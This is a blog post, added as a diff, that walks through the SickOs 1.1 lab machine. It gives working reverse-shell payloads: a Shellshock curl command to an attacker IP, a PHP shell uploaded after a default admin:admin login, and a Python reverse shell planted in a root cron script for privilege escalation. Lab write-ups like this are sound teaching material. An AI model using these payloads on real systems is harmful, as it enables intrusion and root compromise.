@@ -1,0 +1,92 @@
+---
+title: "SickOs 1.1"
+layout: post
+date: 2017-11-04
+image: /assets/images/markdown.jpg
+headerImage: false
+tag:
+- Writeup
+- Pentest
+category: blog
+author: marioibarra
+description:  SickOs 1.1 Writeup
+---
+
+# SickOs 1.1 Writeup
+
+
+
+## Recon
+
+
+A quick nmap scan revealed tcp ports 22 and 3128 open.      
+
+![image](/assets/images/sickos1.1/nmap.png)
+
+
+Port 3128 is a squid HTTP proxy so I ran a nitko scan on it and adjusted my Firefox proxy settings to access the site.
+
+![image](/assets/images/sickos1.1/nikto2.png)
+
+According to the scan the site looks like its vulnerable to shellshock.  I checked the /cgi-bin/status directory to make sure its available.
+
+
+
+## Exploitation Method 1
+
+![image](/assets/images/sickos1.1/cgi-bin.png)
+
+I exploited the shellshock vulnerability with curl
+
+```bash
+curl -x http://10.10.10.11:3128 -H "User-Agent: () { ignored;}; /bin/bash -i >& /dev/tcp/10.10.10.10/1337 0>&1" http://10.10.10.11/cgi-bin/status
+```
+
+I had a netcat listener open to receive the shell.
+
+![image](/assets/images/sickos1.1/shell.png)
+
+
+
+## Exploitation Method 2
+
+I located an wolfcms admin console and was able to login with the default credentials **admin:admin**.
+
+![image](/assets/images/sickos1.1/admin.png)
+
+
+![image](/assets/images/sickos1.1/wolf.png)
+
+I was able to upload a php reverse shell on the web app file manager and I used a metasploit handler to receive the shell.
+
+![image](/assets/images/sickos1.1/4444shell.png)
+
+
+![image](/assets/images/sickos1.1/meterpreter.png)
+
+
+
+## Privilege Escalation
+
+I went with the 1st exploitation method since it was easier than the second.
+With that method, I had a limited shell, so I spawned a TTY shell using python.
+
+```python
+python -c 'import pty; pty.spawn("/bin/sh")'
+```
+
+After looking at the cronjobs in the system, there was one that caught my eye.
+
+![image](/assets/images/sickos1.1/cronjob.png)
+
+This cronjob runs the connect.py script that is in **/var/www* every minute.  Luckily, I had read/write permissions for connect.py since the user owns the file.
+
+I edited connect.py to include a reverse shell.
+
+```python
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+```
+
+With a NC listener open to the port I specified, a root shell opened within a minute after editing the connect.py script.
+
+![image](/assets/images/sickos1.1/root.png)
